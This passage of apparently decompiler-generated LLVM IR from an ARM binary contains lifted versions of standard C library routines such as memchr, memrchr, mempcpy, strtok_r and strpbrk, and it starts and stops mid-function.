  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 13, 14, 15, 16, 17, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 24, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 39, 40, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 54, 1, 2, 3, 4, 5, 55, 6, 7, 8, 9, 10, 56, 11, 12, 13, 14, 15, 57, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 68, 30, 31, 51, 32, 33, 34, 35, 36, 52, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 53 }
  uselistorder i32* %r1.global-to-local, { 2, 5, 3, 17, 4, 6, 8, 10, 7, 18, 9, 11, 13, 15, 12, 19, 14, 16, 20, 25, 21, 22, 23, 24, 26, 27, 29, 28, 30, 31, 72, 32, 33, 73, 34, 74, 35, 75, 36, 37, 38, 39, 76, 78, 81, 77, 80, 79, 82, 87, 84, 85, 83, 40, 41, 43, 45, 42, 47, 44, 46, 48, 49, 54, 50, 51, 52, 53, 55, 56, 58, 57, 59, 60, 86, 61, 62, 66, 63, 67, 64, 68, 65, 69, 70, 71, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 47, 4, 5, 48, 6, 7, 49, 8, 9, 10, 11, 12, 13, 50, 14, 16, 15, 17, 18, 51, 19, 20, 52, 21, 22, 23, 24, 53, 54, 55, 56, 57, 59, 60, 25, 30, 26, 27, 28, 29, 31, 32, 0, 33, 34, 36, 35, 37, 38, 58, 39, 40, 41, 44, 42, 43, 45, 46, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 44, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 2, 1, 4, 34, 5, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 42, 16, 17, 36, 35, 37, 41, 39, 40, 18, 38, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 2, 1, 4, 38, 5, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 48, 17, 18, 40, 39, 41, 45, 42, 47, 44, 46, 19, 43, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16038, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15fcc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15f60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15f00, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_15e8c, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_15e50, { 1, 0 }
  uselistorder label %dec_label_pc_15e3c, { 1, 0 }
  uselistorder label %dec_label_pc_15dfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15d90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15cc4, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 5, 6, 4, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_15c38, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_15bf8, { 1, 0 }
}

define i32 @function_16058(i32 %arg1) local_unnamed_addr {
dec_label_pc_16058:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_16060 = load i32, i32* @r0, align 4
  %v1_16060 = load i32, i32* @r1, align 4
  %v2_16060 = inttoptr i32 %v0_16060 to i8*
  %v3_16060 = call i32 @_memcpy(i8* %v2_16060, i32 %v1_16060)
  ret i32 %v3_16060

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 1, 2, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_16070 = load i32, i32* @r4, align 4
  %v6_16070 = load i32, i32* @r5, align 4
  %v9_16070 = load i32, i32* @r6, align 4
  %v1_16074 = urem i32 %arg1, 256
  %v0_1609018 = load i32, i32* @r2, align 4
  %v2_1609020 = icmp eq i32 %v0_1609018, 0
  br i1 %v2_1609020, label %dec_label_pc_160a0, label %dec_label_pc_16098

dec_label_pc_1607c:                               ; preds = %dec_label_pc_16098
  %v3_1607c = load i8, i8* %.021, align 1
  %v4_1607c = zext i8 %v3_1607c to i32
  %v9_16080 = icmp eq i32 %v4_1607c, %v1_16074
  %v1_16084 = add i32 %v0_16084, -1
  br i1 %v9_16080, label %bb, label %dec_label_pc_16090

bb:                                               ; preds = %dec_label_pc_1607c
  ret i32 %v1_16098

dec_label_pc_16090:                               ; preds = %dec_label_pc_1607c
  %v2_1608c = add i32 %v1_16098, 1
  %v3_1608c = inttoptr i32 %v2_1608c to i8*
  %v2_16090 = icmp eq i32 %v1_16084, 0
  br i1 %v2_16090, label %dec_label_pc_160a0, label %dec_label_pc_16098

dec_label_pc_16098:                               ; preds = %entry, %dec_label_pc_16090
  %v0_16084 = phi i32 [ %v1_16084, %dec_label_pc_16090 ], [ %v0_1609018, %entry ]
  %.021 = phi i8* [ %v3_1608c, %dec_label_pc_16090 ], [ undef, %entry ]
  %v1_16098 = ptrtoint i8* %.021 to i32
  %v2_16098 = urem i32 %v1_16098, 4
  %v3_16098 = icmp eq i32 %v2_16098, 0
  br i1 %v3_16098, label %dec_label_pc_160a0, label %dec_label_pc_1607c

dec_label_pc_160a0:                               ; preds = %dec_label_pc_16090, %dec_label_pc_16098, %entry
  %v0_1612c37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_16090 ], [ %v0_16084, %dec_label_pc_16098 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_1608c, %dec_label_pc_16090 ], [ %.021, %dec_label_pc_16098 ]
  %v4_160a0 = mul nuw nsw i32 %v1_16074, 256
  %v5_160a0 = or i32 %v4_160a0, %v1_16074
  %v1_160a4 = ptrtoint i8* %.0.lcssa to i32
  %v4_160a8 = mul i32 %v5_160a0, 65536
  %v5_160a8 = or i32 %v4_160a8, %v5_160a0
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_1612c37, 3
  br i1 %tmp, label %dec_label_pc_160b0, label %dec_label_pc_16154.preheader

dec_label_pc_160b0:                               ; preds = %dec_label_pc_160a0, %dec_label_pc_1612c.backedge
  %v0_160cc82 = phi i32 [ %v1_160cc, %dec_label_pc_1612c.backedge ], [ %v0_1612c37, %dec_label_pc_160a0 ]
  %v0_160b081 = phi i32 [ %v4_160b0, %dec_label_pc_1612c.backedge ], [ %v1_160a4, %dec_label_pc_160a0 ]
  %v1_160b0 = inttoptr i32 %v0_160b081 to i32*
  %v2_160b0 = load i32, i32* %v1_160b0, align 4
  %v4_160b0 = add i32 %v0_160b081, 4
  %v2_160b4 = xor i32 %v2_160b0, %v5_160a8
  %v2_160b8 = add i32 %v2_160b4, 2130640639
  %v1_160bc = sub i32 -1, %v2_160b4
  %v2_160c0 = xor i32 %v2_160b8, %v1_160bc
  %v2_160c4 = and i32 %v2_160c0, -2130640640
  %v2_160c8 = icmp eq i32 %v2_160c4, 0
  %v1_160cc = add i32 %v0_160cc82, -4
  br i1 %v2_160c8, label %dec_label_pc_1612c.backedge, label %dec_label_pc_160d4

dec_label_pc_1612c.backedge:                      ; preds = %dec_label_pc_160b0, %dec_label_pc_16118
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_160cc, 3
  br i1 %tmp107, label %dec_label_pc_160b0, label %dec_label_pc_16154.preheader

dec_label_pc_160d4:                               ; preds = %dec_label_pc_160b0
  %v2_160d4 = inttoptr i32 %v0_160b081 to i8*
  %v3_160d4 = load i8, i8* %v2_160d4, align 1
  %v4_160d4 = zext i8 %v3_160d4 to i32
  %v9_160dc = icmp eq i32 %v4_160d4, %v1_16074
  %v1_160e0 = add i32 %v0_160b081, 3
  %v1_160e4 = add i32 %v0_160b081, 1
  store i32 %v1_160e4, i32* @lr, align 4
  %v1_160e8 = add i32 %v0_160b081, 2
  br i1 %v9_160dc, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_160d4
  store i32 %v3_16070, i32* @r4, align 4
  store i32 %v6_16070, i32* @r5, align 4
  store i32 %v9_16070, i32* @r6, align 4
  ret i32 %v0_160b081

bb51:                                             ; preds = %dec_label_pc_160d4
  %v2_160f0 = inttoptr i32 %v1_160e4 to i8*
  %v3_160f0 = load i8, i8* %v2_160f0, align 1
  %v4_160f0 = zext i8 %v3_160f0 to i32
  %v9_160f4 = icmp eq i32 %v4_160f0, %v1_16074
  br i1 %v9_160f4, label %dec_label_pc_160fc, label %dec_label_pc_16104

dec_label_pc_160fc:                               ; preds = %bb51
  store i32 %v3_16070, i32* @r4, align 4
  store i32 %v6_16070, i32* @r5, align 4
  store i32 %v9_16070, i32* @r6, align 4
  ret i32 %v1_160e4

dec_label_pc_16104:                               ; preds = %bb51
  %v2_16104 = inttoptr i32 %v1_160e8 to i8*
  %v3_16104 = load i8, i8* %v2_16104, align 1
  %v4_16104 = zext i8 %v3_16104 to i32
  %v9_16108 = icmp eq i32 %v4_16104, %v1_16074
  br i1 %v9_16108, label %dec_label_pc_16110, label %dec_label_pc_16118

dec_label_pc_16110:                               ; preds = %dec_label_pc_16104
  store i32 %v3_16070, i32* @r4, align 4
  store i32 %v6_16070, i32* @r5, align 4
  store i32 %v9_16070, i32* @r6, align 4
  ret i32 %v1_160e8

dec_label_pc_16118:                               ; preds = %dec_label_pc_16104
  %v2_16118 = inttoptr i32 %v1_160e0 to i8*
  %v3_16118 = load i8, i8* %v2_16118, align 1
  %v4_16118 = zext i8 %v3_16118 to i32
  %v9_1611c = icmp eq i32 %v4_16118, %v1_16074
  br i1 %v9_1611c, label %dec_label_pc_16124, label %dec_label_pc_1612c.backedge

dec_label_pc_16124:                               ; preds = %dec_label_pc_16118
  store i32 %v3_16070, i32* @r4, align 4
  store i32 %v6_16070, i32* @r5, align 4
  store i32 %v9_16070, i32* @r6, align 4
  ret i32 %v1_160e0

dec_label_pc_16154.preheader:                     ; preds = %dec_label_pc_1612c.backedge, %dec_label_pc_160a0
  %v0_160b0.lcssa = phi i32 [ %v1_160a4, %dec_label_pc_160a0 ], [ %v4_160b0, %dec_label_pc_1612c.backedge ]
  %v0_160cc.lcssa = phi i32 [ %v0_1612c37, %dec_label_pc_160a0 ], [ %v1_160cc, %dec_label_pc_1612c.backedge ]
  %v2_1615411 = icmp eq i32 %v0_160cc.lcssa, 0
  br i1 %v2_1615411, label %dec_label_pc_1615c, label %dec_label_pc_16144

dec_label_pc_16144:                               ; preds = %dec_label_pc_16154, %dec_label_pc_16154.preheader
  %v0_16154.in = phi i32 [ %v0_16154, %dec_label_pc_16154 ], [ %v0_160cc.lcssa, %dec_label_pc_16154.preheader ]
  %v15_1614c = phi i32 [ %v1_16150, %dec_label_pc_16154 ], [ %v0_160b0.lcssa, %dec_label_pc_16154.preheader ]
  %v0_16154 = add i32 %v0_16154.in, -1
  %v1_16144 = inttoptr i32 %v15_1614c to i8*
  %v2_16144 = load i8, i8* %v1_16144, align 1
  %v3_16144 = zext i8 %v2_16144 to i32
  %v9_16148 = icmp eq i32 %v3_16144, %v1_16074
  br i1 %v9_16148, label %bb52, label %dec_label_pc_16154

bb52:                                             ; preds = %dec_label_pc_16144
  store i32 %v3_16070, i32* @r4, align 4
  store i32 %v6_16070, i32* @r5, align 4
  store i32 %v9_16070, i32* @r6, align 4
  ret i32 %v15_1614c

dec_label_pc_16154:                               ; preds = %dec_label_pc_16144
  %v1_16150 = add i32 %v15_1614c, 1
  %v2_16154 = icmp eq i32 %v0_16154, 0
  br i1 %v2_16154, label %dec_label_pc_1615c, label %dec_label_pc_16144

dec_label_pc_1615c:                               ; preds = %dec_label_pc_16154, %dec_label_pc_16154.preheader
  store i32 %v3_16070, i32* @r4, align 4
  store i32 %v6_16070, i32* @r5, align 4
  store i32 %v9_16070, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_1614c, { 1, 0, 2 }
  uselistorder i32 %v1_160cc, { 1, 0, 2 }
  uselistorder i32 %v0_160b081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_160a0, { 1, 0 }
  uselistorder i32 %v0_1612c37, { 1, 2, 0 }
  uselistorder i32 %v1_16074, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_16070, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1612c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_160b0, { 1, 0 }
  uselistorder label %dec_label_pc_160a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16098, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_16178 = call i32 @memcpy()
  %v0_1617c = load i32, i32* @r5, align 4
  %v1_1617c = load i32, i32* @r4, align 4
  %v2_1617c = add i32 %v1_1617c, %v0_1617c
  ret i32 %v2_1617c
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_16184 = load i32, i32* @r4, align 4
  %v1_16188 = urem i32 %arg2, 256
  %v2_1618c = add i32 %arg3, %arg1
  %v2_161a42 = icmp eq i32 %arg3, 0
  br i1 %v2_161a42, label %dec_label_pc_161b4, label %dec_label_pc_161ac

dec_label_pc_16194:                               ; preds = %dec_label_pc_161ac
  %v1_16194 = add i32 %v0_16194, -1
  %v2_16194 = inttoptr i32 %v1_16194 to i8*
  %v3_16194 = load i8, i8* %v2_16194, align 1
  %v4_16194 = zext i8 %v3_16194 to i32
  %v9_16198 = icmp eq i32 %v4_16194, %v1_16188
  br i1 %v9_16198, label %bb, label %dec_label_pc_161a4

bb:                                               ; preds = %dec_label_pc_16194
  ret i32 %v1_16194

dec_label_pc_161a4:                               ; preds = %dec_label_pc_16194
  %v1_161a0 = add i32 %v0_161a0, -1
  %v2_161a4 = icmp eq i32 %v1_161a0, 0
  br i1 %v2_161a4, label %dec_label_pc_161b4, label %dec_label_pc_161ac

dec_label_pc_161ac:                               ; preds = %entry, %dec_label_pc_161a4
  %v0_161a0 = phi i32 [ %v1_161a0, %dec_label_pc_161a4 ], [ %arg3, %entry ]
  %v0_16194 = phi i32 [ %v1_16194, %dec_label_pc_161a4 ], [ %v2_1618c, %entry ]
  %v1_161ac = urem i32 %v0_16194, 4
  %v2_161ac = icmp eq i32 %v1_161ac, 0
  br i1 %v2_161ac, label %dec_label_pc_161b4, label %dec_label_pc_16194

dec_label_pc_161b4:                               ; preds = %dec_label_pc_161a4, %dec_label_pc_161ac, %entry
  %v0_1624c11 = phi i32 [ %v2_1618c, %entry ], [ %v1_16194, %dec_label_pc_161a4 ], [ %v0_16194, %dec_label_pc_161ac ]
  %v0_162387 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_161a4 ], [ %v0_161a0, %dec_label_pc_161ac ]
  %v4_161b4 = mul nuw nsw i32 %v1_16188, 256
  %v5_161b4 = or i32 %v4_161b4, %v1_16188
  %v4_161b8 = mul i32 %v5_161b4, 65536
  %v5_161b8 = or i32 %v4_161b8, %v5_161b4
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_162387, 3
  br i1 %tmp, label %dec_label_pc_161c0, label %dec_label_pc_16248

dec_label_pc_161c0:                               ; preds = %dec_label_pc_161b4, %.backedge.backedge
  %v0_161dc51 = phi i32 [ %v1_161dc, %.backedge.backedge ], [ %v0_162387, %dec_label_pc_161b4 ]
  %v0_161c050 = phi i32 [ %v1_161c0, %.backedge.backedge ], [ %v0_1624c11, %dec_label_pc_161b4 ]
  %v1_161c0 = add i32 %v0_161c050, -4
  %v2_161c0 = inttoptr i32 %v1_161c0 to i32*
  %v3_161c0 = load i32, i32* %v2_161c0, align 4
  %v2_161c4 = xor i32 %v3_161c0, %v5_161b8
  %v2_161c8 = add i32 %v2_161c4, 2130640639
  %v1_161cc = sub i32 -1, %v2_161c4
  %v2_161d0 = xor i32 %v2_161c8, %v1_161cc
  %v2_161d4 = and i32 %v2_161d0, -2130640640
  %v2_161d8 = icmp eq i32 %v2_161d4, 0
  %v1_161dc = add i32 %v0_161dc51, -4
  br i1 %v2_161d8, label %.backedge.backedge, label %dec_label_pc_161e4

dec_label_pc_161e4:                               ; preds = %dec_label_pc_161c0
  %v1_161e4 = add i32 %v0_161c050, -1
  %v2_161e4 = inttoptr i32 %v1_161e4 to i8*
  %v3_161e4 = load i8, i8* %v2_161e4, align 1
  %v4_161e4 = zext i8 %v3_161e4 to i32
  %v9_161e8 = icmp eq i32 %v4_161e4, %v1_16188
  %v1_161ec = add i32 %v0_161c050, -2
  %v1_161f4 = add i32 %v0_161c050, -3
  store i32 %v1_161f4, i32* @lr, align 4
  br i1 %v9_161e8, label %dec_label_pc_161fc, label %dec_label_pc_16204

dec_label_pc_161fc:                               ; preds = %dec_label_pc_161e4
  store i32 %v3_16184, i32* @r4, align 4
  ret i32 %v1_161e4

dec_label_pc_16204:                               ; preds = %dec_label_pc_161e4
  %v2_16204 = inttoptr i32 %v1_161ec to i8*
  %v3_16204 = load i8, i8* %v2_16204, align 1
  %v4_16204 = zext i8 %v3_16204 to i32
  %v9_16208 = icmp eq i32 %v4_16204, %v1_16188
  br i1 %v9_16208, label %dec_label_pc_16210, label %dec_label_pc_16218

dec_label_pc_16210:                               ; preds = %dec_label_pc_16204
  store i32 %v3_16184, i32* @r4, align 4
  ret i32 %v1_161ec

dec_label_pc_16218:                               ; preds = %dec_label_pc_16204
  %v2_16218 = inttoptr i32 %v1_161f4 to i8*
  %v3_16218 = load i8, i8* %v2_16218, align 1
  %v4_16218 = zext i8 %v3_16218 to i32
  %v9_1621c = icmp eq i32 %v4_16218, %v1_16188
  br i1 %v9_1621c, label %dec_label_pc_16224, label %dec_label_pc_1622c

dec_label_pc_16224:                               ; preds = %dec_label_pc_16218
  store i32 %v3_16184, i32* @r4, align 4
  ret i32 %v1_161f4

dec_label_pc_1622c:                               ; preds = %dec_label_pc_16218
  %v1_1622c = inttoptr i32 %v1_161c0 to i8*
  %v2_1622c = load i8, i8* %v1_1622c, align 1
  %v3_1622c = zext i8 %v2_1622c to i32
  %v9_16230 = icmp eq i32 %v3_1622c, %v1_16188
  br i1 %v9_16230, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_1622c, %dec_label_pc_161c0
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_161dc, 3
  br i1 %tmp70, label %dec_label_pc_161c0, label %dec_label_pc_16248

bb19:                                             ; preds = %dec_label_pc_1622c
  store i32 %v3_16184, i32* @r4, align 4
  ret i32 %v1_161c0

dec_label_pc_1624c:                               ; preds = %dec_label_pc_16248
  %v1_16258 = add i32 %v0_16258, -1
  %v1_1624c = add i32 %v0_1624c, -1
  %v2_1624c = inttoptr i32 %v1_1624c to i8*
  %v3_1624c = load i8, i8* %v2_1624c, align 1
  %v4_1624c = zext i8 %v3_1624c to i32
  %v9_16250 = icmp eq i32 %v4_1624c, %v1_16188
  br i1 %v9_16250, label %bb20, label %dec_label_pc_16248

bb20:                                             ; preds = %dec_label_pc_1624c
  store i32 %v3_16184, i32* @r4, align 4
  ret i32 %v1_1624c

dec_label_pc_16248:                               ; preds = %dec_label_pc_161b4, %.backedge.backedge, %dec_label_pc_1624c
  %v0_1624c = phi i32 [ %v1_1624c, %dec_label_pc_1624c ], [ %v0_1624c11, %dec_label_pc_161b4 ], [ %v1_161c0, %.backedge.backedge ]
  %v0_16258 = phi i32 [ %v1_16258, %dec_label_pc_1624c ], [ %v0_162387, %dec_label_pc_161b4 ], [ %v1_161dc, %.backedge.backedge ]
  %v2_16258 = icmp eq i32 %v0_16258, 0
  br i1 %v2_16258, label %dec_label_pc_16260, label %dec_label_pc_1624c

dec_label_pc_16260:                               ; preds = %dec_label_pc_16248
  store i32 %v3_16184, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_16258, { 1, 0 }
  uselistorder i32 %v1_161dc, { 1, 0, 2 }
  uselistorder i32 %v1_161c0, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_161c050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_161b4, { 1, 0 }
  uselistorder i32 %v0_162387, { 1, 2, 0 }
  uselistorder i32 %v0_16194, { 1, 0, 2 }
  uselistorder i32 %v1_16194, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1618c, { 1, 0 }
  uselistorder i32 %v1_16188, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_16184, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16248, { 2, 1, 0 }
  uselistorder label %dec_label_pc_161c0, { 1, 0 }
  uselistorder label %dec_label_pc_161b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_161ac, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16270 = load i32, i32* @r4, align 4
  store i32 %v3_16270, i32* %stack_var_-16, align 4
  %v6_16270 = load i32, i32* @r5, align 4
  %v0_16274 = load i32, i32* @r0, align 4
  store i32 %v0_16274, i32* %r4.global-to-local, align 4
  %v2_16274 = icmp eq i32 %v0_16274, 0
  %v1_16278 = load i32, i32* @r2, align 4
  br i1 %v2_16274, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_16278 = inttoptr i32 %v1_16278 to i32*
  %v3_16278 = load i32, i32* %v2_16278, align 4
  store i32 %v3_16278, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1627c = phi i32 [ %v3_16278, %bb ], [ %v0_16274, %entry ]
  store i32 %v0_1627c, i32* @r0, align 4
  store i32 %v1_16278, i32* @r5, align 4
  %v0_16284 = load i32, i32* @r1, align 4
  store i32 %v0_16284, i32* %r6.global-to-local, align 4
  %v1_16288 = inttoptr i32 %v0_1627c to i8*
  %v2_16288 = call i32 @__GI_strspn(i8* %v1_16288)
  %v0_1628c = load i32, i32* %r4.global-to-local, align 4
  %v2_1628c = add i32 %v0_1628c, %v2_16288
  %v3_1628c = inttoptr i32 %v2_1628c to i8*
  %v4_1628c = load i8, i8* %v3_1628c, align 1
  %v6_1628c = zext i8 %v4_1628c to i32
  store i32 %v6_1628c, i32* %r3.global-to-local, align 4
  store i32 %v2_1628c, i32* @r4, align 4
  %v2_16294 = icmp eq i8 %v4_1628c, 0
  store i1 %v2_16294, i1* @cpsr_z, align 1
  %v0_16298 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16298, i32* @r1, align 4
  store i32 %v2_1628c, i32* @r0, align 4
  br i1 %v2_16294, label %bb7, label %dec_label_pc_162a8

bb7:                                              ; preds = %entry._crit_edge
  %v2_162a0 = load i32, i32* @r5, align 4
  %v3_162a0 = inttoptr i32 %v2_162a0 to i32*
  store i32 %v2_1628c, i32* %v3_162a0, align 4
  br label %dec_label_pc_162dc

dec_label_pc_162a8:                               ; preds = %entry._crit_edge
  %v0_162a8 = call i32 @__GI_strpbrk()
  store i32 %v0_162a8, i32* %r2.global-to-local, align 4
  %v3_162ac = icmp eq i32 %v0_162a8, 0
  store i1 %v3_162ac, i1* @cpsr_z, align 1
  br i1 %v3_162ac, label %dec_label_pc_162bc, label %dec_label_pc_162cc

dec_label_pc_162bc:                               ; preds = %dec_label_pc_162a8
  %v0_162b4 = load i32, i32* @r4, align 4
  %v2_162bc = call i32 @rawmemchr(i32 %v0_162b4, i32 0)
  %v0_162c0 = load i32, i32* @r4, align 4
  store i32 %v0_162c0, i32* %r3.global-to-local, align 4
  %v1_162c4 = load i32, i32* @r5, align 4
  %v2_162c4 = inttoptr i32 %v1_162c4 to i32*
  store i32 %v2_162bc, i32* %v2_162c4, align 4
  br label %dec_label_pc_162dc

dec_label_pc_162cc:                               ; preds = %dec_label_pc_162a8
  %v3_162d0 = inttoptr i32 %v0_162a8 to i8*
  store i8 0, i8* %v3_162d0, align 1
  %v4_162d0 = load i32, i32* %r2.global-to-local, align 4
  %v5_162d0 = add i32 %v4_162d0, 1
  store i32 %v5_162d0, i32* @r2, align 4
  %v1_162d4 = load i32, i32* @r5, align 4
  %v2_162d4 = inttoptr i32 %v1_162d4 to i32*
  store i32 %v5_162d0, i32* %v2_162d4, align 4
  %v0_162d8 = load i32, i32* @r4, align 4
  store i32 %v0_162d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_162dc

dec_label_pc_162dc:                               ; preds = %bb7, %dec_label_pc_162bc, %dec_label_pc_162cc
  %v0_162dc = load i32, i32* %r3.global-to-local, align 4
  %v2_162e0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_162e0, i32* @r4, align 4
  store i32 %v6_16270, i32* @r5, align 4
  ret i32 %v0_162dc

; uselistorder directives
  uselistorder i32 %v0_1627c, { 1, 0 }
  uselistorder i32 %v0_16274, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_162dc, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_162e4 = load i32, i32* @r0, align 4
  %v1_163082 = inttoptr i32 %v0_162e4 to i8*
  %v2_163083 = load i8, i8* %v1_163082, align 1
  %v3_163084 = zext i8 %v2_163083 to i32
  %v2_1630c5 = icmp eq i8 %v2_163083, 0
  br i1 %v2_1630c5, label %dec_label_pc_16308._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_16314.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_162ec:                               ; preds = %dec_label_pc_162f4
  %v1_162fc = add i32 %v0_162fc, 1
  %v9_162ec = icmp eq i32 %v3_162f4, %v3_163086
  br i1 %v9_162ec, label %dec_label_pc_1631c, label %dec_label_pc_162f4

dec_label_pc_162f4:                               ; preds = %dec_label_pc_162ec, %bb
  %v0_162fc = phi i32 [ %v1_162fc, %dec_label_pc_162ec ], [ %v0_16314.pre, %bb ]
  %v1_162f4 = inttoptr i32 %v0_162fc to i8*
  %v2_162f4 = load i8, i8* %v1_162f4, align 1
  %v3_162f4 = zext i8 %v2_162f4 to i32
  store i32 %v3_162f4, i32* @ip, align 4
  %v2_162f8 = icmp eq i8 %v2_162f4, 0
  br i1 %v2_162f8, label %dec_label_pc_16304, label %dec_label_pc_162ec

dec_label_pc_16304:                               ; preds = %dec_label_pc_162f4
  %v1_16304 = add i32 %v0_16304, 1
  %v1_16308 = inttoptr i32 %v1_16304 to i8*
  %v2_16308 = load i8, i8* %v1_16308, align 1
  %v3_16308 = zext i8 %v2_16308 to i32
  %v2_1630c = icmp eq i8 %v2_16308, 0
  br i1 %v2_1630c, label %dec_label_pc_16308._crit_edge, label %bb

dec_label_pc_16308._crit_edge:                    ; preds = %dec_label_pc_16304, %entry
  %v3_16308.lcssa = phi i32 [ %v3_163084, %entry ], [ %v3_16308, %dec_label_pc_16304 ]
  ret i32 %v3_16308.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_16304
  %v0_16304 = phi i32 [ %v0_162e4, %.lr.ph ], [ %v1_16304, %dec_label_pc_16304 ]
  %v3_163086 = phi i32 [ %v3_163084, %.lr.ph ], [ %v3_16308, %dec_label_pc_16304 ]
  br label %dec_label_pc_162f4

dec_label_pc_1631c:                               ; preds = %dec_label_pc_162ec
  ret i32 %v0_16304

; uselistorder directives
  uselistorder i32 %v3_16308, { 1, 0 }
  uselistorder i32 %v3_162f4, { 1, 0 }
